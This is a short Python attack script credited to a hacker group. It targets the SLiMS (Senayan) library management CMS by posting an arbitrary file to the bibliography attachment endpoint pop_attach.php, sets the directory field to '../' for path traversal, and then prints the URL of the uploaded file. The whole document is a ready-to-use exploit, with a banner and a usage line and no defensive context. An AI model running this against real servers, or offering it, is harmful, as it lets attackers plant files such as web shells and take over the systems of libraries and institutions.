#!/usr/bin/python
import requests,os,sys
def banner():
    print("""
    ````````````````````` @author : FilthyRoot
    ` Slims CMS Senayan ` @github : Sora Cyber Team
    `   File Uploader   ` Jogjakarta Hacker Rulez (c) 2020
    `````````````````````
    """)
def write_file(name):
    if os.path.isfile(name):
        sys.argv[2] = name
    else:
        os.system("nano /tmp/" + name + "")
        sys.argv[2] = "/tmp/" + name + ""

def post_file(target,filenya):
    
    data = {
    'fileTitle':'a',
    'fileDir':'../',
    'fileURL':'a',
    'fileDesc':'a',
    'accessType':'public',
    'upload':'true',
    }
    
    files = {
    'file2attach':('' + filenya + '',open('' + filenya + '','rb'))
    }
    
    r = requests.post("http://"+ target + "/admin/modules/bibliography/pop_attach.php", files = files, data = data)
    print("Result : http://" + target + "/" + filenya)

if len(sys.argv) < 2:
    banner()
    print("Usage : python slims.py target.com /path/filename.txt")
else:
    banner()
    write_file(sys.argv[2])
    post_file(sys.argv[1], sys.argv[2])
